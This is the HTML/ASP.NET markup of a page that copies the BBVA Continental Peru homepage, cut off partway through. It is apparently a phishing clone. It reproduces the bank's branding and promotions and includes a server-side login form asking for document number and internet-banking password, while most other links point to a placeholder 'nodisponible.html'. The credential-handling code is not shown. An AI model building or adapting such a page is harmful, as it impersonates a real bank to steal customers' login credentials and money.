<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="default.aspx.cs" Inherits="BankData._default" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="user-scalable=no, initial-scale=1, maximum-scale=1"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <title>Bienvenido a su banco | BBVA Continental</title>
    <meta name="description" content="En el banco BBVA Continental, líder del mercado financiero y bancos en Perú, encontrarás lo que buscas en ahorro e inversión, tarjetas, préstamos y seguros."/>
    <meta name="keywords" content="bbva continental, banco, bancos en peru, ahorro, inversiones, tarjetas, prestamos, seguros"/>
    <meta name="author" content="BBVA"/>
    <link rel="canonical" href="https://www.bbvacontinental.pe/"/>
    <link rel="shortcut icon" href="images/favicon.ico"/>
    <link rel="stylesheet" href="css/libraries.css"/>
    <link href="css/generalBase-mobile.css" type="text/css" rel="stylesheet"/>
    <link href="css/generalBase-mobile.css" type="text/css" media="only screen and (min-width: 481px)" rel="stylesheet"/>
    <link href="css/generalBase-desktop.css" type="text/css" media="only screen and (min-width: 800px)" rel="stylesheet"/>
    <!-- LATAM -->
    <link rel="stylesheet" href="css/vendor.min.ver18.css"/>
    <link rel="stylesheet" href="css/main-mobile.min.ver40.css"/>
    <link rel="stylesheet" type="text/css" media="only screen and (min-width: 481px)" href="css/main-tablet.min.ver28.css"/>
    <link rel="stylesheet" type="text/css" media="only screen and (min-width: 800px)" href="css/main-desktop.min.ver27.css"/>
    <link rel="stylesheet" href="css/main.css"/>
    <script type="text/javascript" src="js/modernizr-v2.min.js"></script>
</head>
<body class="continental" id="body">
    <form id="form1" runat="server">
        <div>
         <header class="body-header">
    <div class="container">
      <ul class="top-menu">
        <li>
          <i class="bbva-icon icon-uniE087 "></i>
          <a href="nodisponible.html" class="">Tu Seguridad</a>
        </li>
        <li>
          <i class="bbva-icon icon-uniE10A "></i>
          <a href="nodisponible.html" class="" target="_blank">Ubícanos</a>
        </li>
        <li>
          <i class="bbva-icon icon-uniE0E5 avisoRed"></i>
          <a href="nodisponible.html" class="avisoRed">SOS Cliente</a>
        </li>
        <li>
          <i class="bbva-icon icon-uniE10B "></i>
          <a href="nodisponible.html" class="">(01) 595-0000</a>
        </li>
      </ul>
      <div class="logo-container">
        <a href="#" class="navbar-trigger">&nbsp;</a>
        <a href="/" class="logo-cabecera">
          <img src="images/logoperu_tcm1105-418187.png" alt="Logo BBVA Continental" title="Logo BBVA Continental" class="logo-desktop"
            width="356" height="90">
        </a>
        <a href="/" class="logo-cabecera">
          <img src="images/logo_tcm1105-421006.jpg" alt="Logo BBVA Continental" title="Logo BBVA Continental" class="logo-tablet" width="301"
            height="30">
        </a>
      </div>
      <!-- color bar -->
      <div class="color-bar">
        <span class="first">&nbsp;</span>
        <span class="second">&nbsp;</span>
        <span class="third">&nbsp;</span>
        <span class="fourth">&nbsp;</span>
        <span class="fifth">&nbsp;</span>
        <span class="sixth">&nbsp;</span>
      </div>
      <div class="main-menu">
        <div class="header-buttons">
          <form id="main-form" class="form">
            <a id="buttonaccess0" href="#" class="btn success form-trigger header-btn">
              <i class="bbva-icon icon-uniE0B5"></i>Banca por Internet
            </a>
            <div class="move-to" data-device="tablet phone" data-element="login-form">
              <!-- main form -->
              <div id="form-buttonaccess0" class="hidden main-form">
                <!-- main form -> document-type -->
                <div class="form-section document-type">
                  <select id="documentType" name="document-type" class="">
                    <option value="DNI" selected="selected">DNI</option>
                    <option value="RUC">RUC</option>
                    <option value="PASAPORTE">Pasaporte</option>
                    <option value="EXTRANJERIA">Carnet de Extranjería</option>
                    <option value="MILITAR">Carnet Identidad Militar</option>
                    <option value="DIPLOMATICO">Carnet Diplomático</option>
                    <option value="NACIMIENTO">Partida de Nacimiento</option>
                  </select>
                </div>
                <!-- main form -> document-number -->
                <div class="form-section document-number">
                  <input id="documentNumber" type="text" name="documentNumber" placeholder="Número de documento">
                </div>
                <!-- main form -> remember-document -->
                <div class="form-section remember-document">
                  <input type="checkbox" name="" id="">
                  <label for="rememberDocument">Recordar documento</label>
                  <img class="img" src="images/imgayuda_u5.png" style="display: inline;">
                </div>
                <!-- main form -> password -->
                <div class="form-section password">
                  <i class="icon-show-pass show-pass"></i>
                  <a style="display: none; left: 76px;" class="pie tooltip-icon-password">
                    <span class="colite" id="colite_mostrar_password" style="left: 134px;">
                      <i></i>
                    </span>
                    <span class="msje">Clic para ver contraseña
                      <i></i>
                    </span>
                  </a>
                  <input id="password" name="password" maxlength="9" placeholder="Contraseña de Banca por Internet" tabindex="4" type="password">
                </div>
                <!-- main form -> button-enter -->
                <div class="form-section button-enter">
                  <button id="enterButton" class="btn-enter" type="button" tabindex="5">Entrar</button>
                </div>
                <!-- main form -> recover-password -->
                <div class="form-section recover-password">
                  <a class="recover-pass-link" id="recover-pass-link" href="#">¿Olvidaste o bloqueaste tu contraseña?</a>
                </div>
                <!-- main form -> register -->
                <div class="form-section register">
                  <a id="register-btn" class="register-btn" href="#">¿Ingresas por primera vez?</a>
                </div>
              </div>
              <!-- /main-form -->
            </div>
            <input class="input-for-search" type="search" id="q_head" name="q" class="form-control input-search ui-autocomplete-input"
              autocomplete="off">
            <span role="status" aria-live="polite" class="ui-helper-hidden-accessible"></span>
            <i class="bbva-icon search-icon icon-glyph-2"></i>
          </form>
        </div>
        <div class="menu-trigger active first-child" data-target="#submenu-Personas">
          <a title="Personas" href="nodisponible.html">Personas</a>
        </div>
        <ul id="submenu-Personas" class="sub-menu active">
          <li class="home active">
            <a href="nodisponible.html">
              <i class="bbva-icon icon-uniE084"></i>
              <span class="text">Inicio</span>
            </a>
          </li>
          <li style="width: 18%;">
            <a title="Cuentas y Ahorro" href="nodisponible.html">
              <i class="bbva-icon icon-uniE021"></i>Cuentas y Ahorro</a>
          </li>
          <li style="width: 18%;">
            <a title="Tarjetas" href="nodisponible.html">
              <i class="bbva-icon icon-uniE023"></i>Tarjetas</a>
          </li>
          <li style="width: 18%;">
            <a title="Préstamos" href="nodisponible.html">
              <i class="bbva-icon icon-uniE02A"></i>Préstamos</a>
          </li>
          <li style="width: 18%;">
            <a title="Inversiones" href="nodisponible.html">
              <i class="bbva-icon icon-uniE12D"></i>Inversiones</a>
          </li>
          <li style="width: 18%;">
            <a title="Seguros" href="nodisponible.html">
              <i class="bbva-icon icon-uniE02D"></i>Seguros</a>
          </li>
          <li class="search">
            <form action="/buscador/">
              <input type="search" name="q" id="q_head" class="form-control input-search ui-autocomplete-input" autocomplete="off">
              <span role="status" aria-live="polite" class="ui-helper-hidden-accessible"></span>
              <i class="bbva-icon icon-glyph-2"></i>
            </form>
          </li>
        </ul>
        <div class="menu-trigger" data-target="#submenu-Negocios">
          <a title="Negocios" href="nodisponible.html">Negocios</a>
        </div>
        <ul id="submenu-Negocios" class="sub-menu">
          <li class="home">
            <a href="nodisponible.html">
              <i class="bbva-icon icon-uniE084"></i>
              <span class="text">Inicio</span>
            </a>
          </li>
          <li>
            <a title="Financiamiento" href="nodisponible.html">
              <i class="bbva-icon icon-uniE028"></i>Financiamiento</a>
          </li>
          <li>
            <a title="Cobros y Pagos" href="nodisponible.html">
              <i class="bbva-icon icon-uniE03F"></i>Cobros y Pagos</a>
          </li>
          <li>
            <a title="Inversiones" href="nodisponible.html">
              <i class="bbva-icon icon-uniE12D"></i>Inversiones</a>
          </li>
          <li>
            <a title="Seguros" href="nodisponible.html">
              <i class="bbva-icon icon-uniE02D"></i>Seguros</a>
          </li>
          <li>
            <a title="Negocios Internacionales" href="nodisponible.html">
              <i class="bbva-icon icon-uniE012"></i>Negocios Internacionales</a>
          </li>
          <li class="search">
            <form action="/buscador/">
              <input type="search" name="q" id="q_head" class="form-control input-search ui-autocomplete-input" autocomplete="off">
              <span role="status" aria-live="polite" class="ui-helper-hidden-accessible"></span>
              <i class="bbva-icon icon-glyph-2"></i>
            </form>
          </li>
        </ul>
        <div class="menu-trigger last-child" data-target="#submenu-Empresas">
          <a title="Empresas" href="nodisponible.html">Empresas</a>
        </div>
        <ul id="submenu-Empresas" class="sub-menu">
          <li class="home">
            <a href="nodisponible.html">
              <i class="bbva-icon icon-uniE084"></i>
              <span class="text">Inicio</span>
            </a>
          </li>
          <li>
            <a title="Financiación y Cobertura de Riesgo" href="nodisponible.html">
              <i class="bbva-icon icon-uniE028"></i>Financiación y Cobertura de Riesgo</a>
          </li>
          <li>
            <a title="Cuentas Empresariales" href="nodisponible.html">
              <i class="bbva-icon icon-uniE021"></i>Cuentas Empresariales</a>
          </li>
          <li>
            <a title="Cobros y Pagos" href="nodisponible.html">
              <i class="bbva-icon icon-uniE03F"></i>Cobros y Pagos</a>
          </li>
          <li>
            <a title="Negocios Internacionales" href="nodisponible.html">
              <i class="bbva-icon icon-uniE012"></i>Negocios Internacionales</a>
          </li>
          <li class="search">
            <form action="/buscador/">
              <input type="search" name="q" id="q_head" class="form-control input-search ui-autocomplete-input" autocomplete="off">
              <span role="status" aria-live="polite" class="ui-helper-hidden-accessible"></span>
              <i class="bbva-icon icon-glyph-2"></i>
            </form>
          </li>
        </ul>
      </div>
    </div>
    <div class="blue-full-width-line"></div>
    <div class="move-to" data-device="tablet,phone" data-element="login-form"></div>
  </header>
  <div class="main">
    <h1 class="container hidden">Bienvenido a su banco BBVA Continental</h1>
    <section id="swiper-impacto-2" data-swiper-tablet="{ &quot;pagination&quot;: &quot;.swiper-pagination&quot;, &quot;autoHeight&quot;: true, &quot;autoplay&quot;: 5000 }"
      data-swiper-desktop="{ &quot;slidesPerView&quot;: 1, &quot;centeredSlides&quot;: true, &quot;slideToClickedSlide&quot;: true, &quot;spaceBetween&quot;: 0, &quot;autoHeight&quot;: false, &quot;nextButton&quot;: &quot;#button-next2&quot;, &quot;prevButton&quot;: &quot;#button-prev2&quot;, &quot;loop&quot;: true, &quot;loopedSlides&quot;: 3, &quot;speed&quot;: 800, &quot;autoplay&quot;: 5000 }"
      class="swiper swiper-impacto swiper-updated">
      <div class="swiper-container swiper-container-horizontal">
        <div class="swiper-wrapper" style="transform: translate3d(-5404px, 0px, 0px); transition-duration: 0ms;">
          <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="3" style="width: 1351px;">
            <section id="impacto-pastilla2-3" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/seguro-vehicular-bbva-movil_tcm1105-618833.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/seguro-vehicular-ancho-completo_tcm1105-610207.png" alt="Seguro Vehicular" title="Seguro Vehicular" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="004" data-quantity="" data-producto="seguro vehicular" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="pide tu seguro vehicular y participa por 10 tvs de 55 y 10 camisetas de la seleccion">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco right">
                      <div class="title title-xl">
                        <h2>Contrata tu
                          <strong>Seguro Vehicular</strong>
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Y participa por el sorteo de
                        <strong>10 TVs 55"</strong> y
                        <strong>10 camisetas de la selección</strong>.
                      </div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Pide tu Seguro Vehicular aquí</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Más información</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="4" style="width: 1351px;">
            <section id="impacto-pastilla2-4" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/fondos-mutuos-movil_tcm1105-631742.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/fondos-mutuos-ancho-completo_tcm1105-631679.png" alt="Fondos Mutuos" title="Fondos Mutuos" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="005" data-quantity="8000" data-producto="fondos mutuos" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="incrementa tus fondos mutuos desde banca movil o banca por internet y participa">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco">
                      <div class="title title-xl">
                        <h2>Incrementa tus
                          <strong>Fondos Mutuos</strong> y
                          <strong>gana S/8,000</strong>
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Hazlo desde la App Banca Móvil o Banca por Internet y participa del sorteo.</div>
                      <div>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Más información</a>
                        <a class="btn btn-destacado btn-lg" rel="lightbox;700;650" href="nodisponible.html" title="Invierte en Fondos Mutuos desde Banca por Internet">Incrementa tu Fondo Mutuo</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="5" style="width: 1351px;">
            <section id="impacto-pastilla2-5" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/credito-hipotecario-movil_tcm1105-580018.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/credito-hipotecario-landing-ancho-completo_tcm1105-580017.png" alt="BBVA Continental Crédito Hipotecario"
                  title="BBVA Continental Crédito Hipotecario" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="006" data-quantity="" data-producto="creditos hipotecarios" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="calculadora de credito hipotecario">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco">
                      <div class="title title-xl">
                        <h2>Múdate del sueño de una casa a la casa de tus sueños</h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Solicítalo online y disfruta de increíbles beneficios.</div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Pide tu Crédito Hipotecario</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Más información</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-prev" data-swiper-slide-index="0" style="width: 1351px;">
            <section id="impacto-pastilla2-0" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/prestamo-al-toque-movil_tcm1105-607988.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/prestamo-al-toque-ancho-completo_tcm1105-607986.png" alt="Préstamo Al Toque" title="Préstamo Al Toque" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="001" data-quantity="500" data-producto="prestamo de libre disponibilidad" data-codprod=""
                data-campaignformat="carrusel" data-location="2,12" data-campaignname="pide tu prestamo online y participa por 500">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco-alpha">
                      <div class="title title-xl">
                        <h2>
                          <p>¡Pagamos tu primera cuota de S/500!</p>
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Multiplica x5 tus opciones si lo pides por la web y sé uno de los 20 ganadores.</div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Pide tu Préstamo</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Aprende cómo</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-active" data-swiper-slide-index="1" style="width: 1351px;">
            <section id="impacto-pastilla2-1" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/tarjetas-devolucion-en-primera-compra-movil_tcm1105-694787.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/tarjetas-devolucion-en-primera-compra-ancho-completo_tcm1105-694786.png" alt="Tarjetas devolución en primera compra"
                  title="Tarjetas devolución en primera compra" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="002" data-quantity="200" data-producto="tarjeta de credito al toque" data-codprod=""
                data-campaignformat="carrusel" data-location="2,12" data-campaignname="pide una tarjeta de credito y te devolvemos 200">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco">
                      <div class="title title-xl">
                        <h2>Pide tu
                          <strong>Tarjeta de Crédito</strong> y
                          <strong>te devolvemos S/200</strong> en tu primera compra mínima de S/400.
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Descubre si tienes una Tarjeta aprobada y recíbela en tu casa u oficina en 72 horas.
                      </div>
                      <div>
                        <a class="btn btn-destacado btn-lg" rel="lightbox;600;650" href="nodisponible.html" title="Pídela ingresando a Banca por Internet">Pide tu Tarjeta de Crédito aquí</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Descubre cómo pedirla</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-next" data-swiper-slide-index="2" style="width: 1351px;">
            <section id="impacto-pastilla2-2" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/tarjeta-del-hincha-movil_tcm1105-696233.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/tarjeta-del-hincha-ancho-completo_tcm1105-696232.png" alt="Tarjeta del hincha" title="Tarjeta del hincha"
                  style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;" width="1351"
                  height="475">
              </picture>
              <div class="container" data-collectivecode="003" data-quantity="" data-producto="tarjetas" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="pide tu tarjeta del hincha">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco-alpha">
                      <div class="title title-xl">
                        <h2>¡Pide tu tarjeta del hincha!</h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Abre tu cuenta y accede a beneficios exclusivos para hinchas.</div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Abre tu cuenta</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Entérate más</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide" data-swiper-slide-index="3" style="width: 1351px;">
            <section id="impacto-pastilla2-3" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/seguro-vehicular-bbva-movil_tcm1105-618833.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/seguro-vehicular-ancho-completo_tcm1105-610207.png" alt="Seguro Vehicular" title="Seguro Vehicular" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="004" data-quantity="" data-producto="seguro vehicular" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="pide tu seguro vehicular y participa por 10 tvs de 55 y 10 camisetas de la seleccion">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco right">
                      <div class="title title-xl">
                        <h2>Contrata tu
                          <strong>Seguro Vehicular</strong>
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Y participa por el sorteo de
                        <strong>10 TVs 55"</strong> y
                        <strong>10 camisetas de la selección</strong>.
                      </div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Pide tu Seguro Vehicular aquí</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Más información</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide" data-swiper-slide-index="4" style="width: 1351px;">
            <section id="impacto-pastilla2-4" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/fondos-mutuos-movil_tcm1105-631742.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/fondos-mutuos-ancho-completo_tcm1105-631679.png" alt="Fondos Mutuos" title="Fondos Mutuos" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="005" data-quantity="8000" data-producto="fondos mutuos" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="incrementa tus fondos mutuos desde banca movil o banca por internet y participa">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco">
                      <div class="title title-xl">
                        <h2>Incrementa tus
                          <strong>Fondos Mutuos</strong> y
                          <strong>gana S/8,000</strong>
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Hazlo desde la App Banca Móvil o Banca por Internet y participa del sorteo.</div>
                      <div>
                        <a class="btn btn-normal  btn-lg" href="https://www.bbvacontinental.pe/personas/inversiones/fondos-mutuos/">Más información</a>
                        <a class="btn btn-destacado btn-lg" rel="lightbox;700;650" href="https://www.bbvacontinental.pe/fbin/repositorio/login-onboarding.html?in_cod_prod=FM"
                          title="Invierte en Fondos Mutuos desde Banca por Internet">Incrementa tu Fondo Mutuo</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide" data-swiper-slide-index="5" style="width: 1351px;">
            <section id="impacto-pastilla2-5" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/credito-hipotecario-movil_tcm1105-580018.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/credito-hipotecario-landing-ancho-completo_tcm1105-580017.png" alt="BBVA Continental Crédito Hipotecario"
                  title="BBVA Continental Crédito Hipotecario" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="006" data-quantity="" data-producto="creditos hipotecarios" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="calculadora de credito hipotecario">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco">
                      <div class="title title-xl">
                        <h2>Múdate del sueño de una casa a la casa de tus sueños</h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Solicítalo online y disfruta de increíbles beneficios.</div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Pide tu Crédito Hipotecario</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Más información</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="0" style="width: 1351px;">
            <section id="impacto-pastilla2-0" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/prestamo-al-toque-movil_tcm1105-607988.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/prestamo-al-toque-ancho-completo_tcm1105-607986.png" alt="Préstamo Al Toque" title="Préstamo Al Toque" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="001" data-quantity="500" data-producto="prestamo de libre disponibilidad" data-codprod=""
                data-campaignformat="carrusel" data-location="2,12" data-campaignname="pide tu prestamo online y participa por 500">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco-alpha">
                      <div class="title title-xl">
                        <h2>
                          <p>¡Pagamos tu primera cuota de S/500!</p>
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Multiplica x5 tus opciones si lo pides por la web y sé uno de los 20 ganadores.</div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Pide tu Préstamo</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Aprende cómo</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="1" style="width: 1351px;">
            <section id="impacto-pastilla2-1" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/tarjetas-devolucion-en-primera-compra-movil_tcm1105-694787.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/tarjetas-devolucion-en-primera-compra-ancho-completo_tcm1105-694786.png" alt="Tarjetas devolución en primera compra"
                  title="Tarjetas devolución en primera compra" style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;"
                  width="1351" height="475">
              </picture>
              <div class="container" data-collectivecode="002" data-quantity="200" data-producto="tarjeta de credito al toque" data-codprod=""
                data-campaignformat="carrusel" data-location="2,12" data-campaignname="pide una tarjeta de credito y te devolvemos 200">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco">
                      <div class="title title-xl">
                        <h2>Pide tu
                          <strong>Tarjeta de Crédito</strong> y
                          <strong>te devolvemos S/200</strong> en tu primera compra mínima de S/400.
                        </h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Descubre si tienes una Tarjeta aprobada y recíbela en tu casa u oficina en 72 horas.
                      </div>
                      <div>
                        <a class="btn btn-destacado btn-lg" rel="lightbox;600;650" href="nodisponible.html" title="Pídela ingresando a Banca por Internet">Pide tu Tarjeta de Crédito aquí</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Descubre cómo pedirla</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
          <div class="swiper-slide swiper-slide-duplicate" data-swiper-slide-index="2" style="width: 1351px;">
            <section id="impacto-pastilla2-2" class="impacto-pastilla-v2 height-md-450">
              <picture class="img-fit">
                <source media="(max-width: 480px)" srcset="images/tarjeta-del-hincha-movil_tcm1105-696233.png">
                <source media="(max-width: 799px)" srcset="">
                <img src="images/tarjeta-del-hincha-ancho-completo_tcm1105-696232.png" alt="Tarjeta del hincha" title="Tarjeta del hincha"
                  style="opacity: 1; bottom: inherit; width: 100%; height: 475px; top: 0px; margin-top: 0px;" width="1351"
                  height="475">
              </picture>
              <div class="container" data-collectivecode="003" data-quantity="" data-producto="tarjetas" data-codprod="" data-campaignformat="carrusel"
                data-location="2,12" data-campaignname="pide tu tarjeta del hincha">
                <div class="vertical-align">
                  <div class="align-middle">
                    <div class="pastilla template-blanco-alpha">
                      <div class="title title-xl">
                        <h2>¡Pide tu tarjeta del hincha!</h2>
                      </div>
                      <hr>
                      <div class="title title-xs">Abre tu cuenta y accede a beneficios exclusivos para hinchas.</div>
                      <div>
                        <a class="btn btn-destacado btn-lg" href="nodisponible.html" target="_blank">Abre tu cuenta</a>
                        <a class="btn btn-normal  btn-lg" href="nodisponible.html">Entérate más</a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </section>
          </div>
        </div>
        <div class="swiper-pagination"></div>
      </div>
      <div id="button-prev2" class="swiper-button-prev"></div>
      <div id="button-next2" class="swiper-button-next"></div>
    </section>
    <section id="destacado-3" class="destacado-una-linea template-azul5">
      <div class="container">
        <div class="firstText">
          <p>
            <strong>Pide tu préstamo online y participa en el sorteo de S/5,000&nbsp;</strong>
          </p>
        </div>
        <a class="btn btn-destacado btnLinea btn " href="nodisponible.html" target="_blank">Pídelo aquí</a>
      </div>
    </section>
    <section class="contenido-enlace-iconos template-gris" id="enlaces-relacionados-con-icono-botones-4">
      <div class="container">
        <h2 class="enlaces-title title title-lg"></h2>
        <div id="enlaces-relacionados-icono-botones4-0" class="g-sm-12 g-lg-4 swiper-slide">
          <div class="enlace-relacionado template-blanco fh-elm" data-collectivecode="010" data-quantity="20000" data-producto="app banca movil"
            data-codprod="" data-campaignformat="carrusel" data-location="4,12" data-campaignname="usa el app y gana 20000"
            data-fh-fixed="true" data-fh-end="true" style="opacity: 1;">
            <div class="fh-part" style="height: 388px;">
              <div class="img-fit img-fit-sm">
                <img src="images/kv-digitalizacion_tcm1105-702143.png" alt="Digitalización secundario" title="Digitalización secundario"
                  style="opacity: 1; width: 360px; height: 100%; top: 0px; left: 50%; margin-left: -180px;" width="180" height="130">
              </div>
              <div class="content-block">
                <div class="ico-block">
                  <img src="images/nuevas-funcionalidades-icono_tcm1105-702173.png" alt="" title="" width="" height="">
                </div>
                <h3 class="title title-md">Usa la App y participas por
                  <strong>S/1,000 semanales</strong>.
                </h3>
                <div class="p-block">Además, si la usas todos los meses, entras al sorteo por
                  <strong>S/20,000</strong>.
                </div>
              </div>
              <div class="in-flow-bottom fh-part" style="height: 0px;"></div>
              <div class="buttons">
                <a class="btn btn-destacado btn-md" href="nodisponible.html" target="_blank">Inscríbete en el sorteo</a>
              </div>
            </div>
          </div>
        </div>
        <div id="enlaces-relacionados-icono-botones4-1" class="g-sm-12 g-lg-4 swiper-slide">
          <div class="enlace-relacionado template-blanco fh-elm" data-collectivecode="011" data-quantity="" data-producto="tarjeta del hincha"
            data-codprod="" data-campaignformat="carrusel" data-location="4,12" data-campaignname="pide tu tarjeta del hincha y accede a grandes beneficios"
            data-fh-fixed="true" data-fh-end="true" style="opacity: 1;">
            <div class="fh-part" style="height: 388px;">
              <div class="img-fit img-fit-sm">
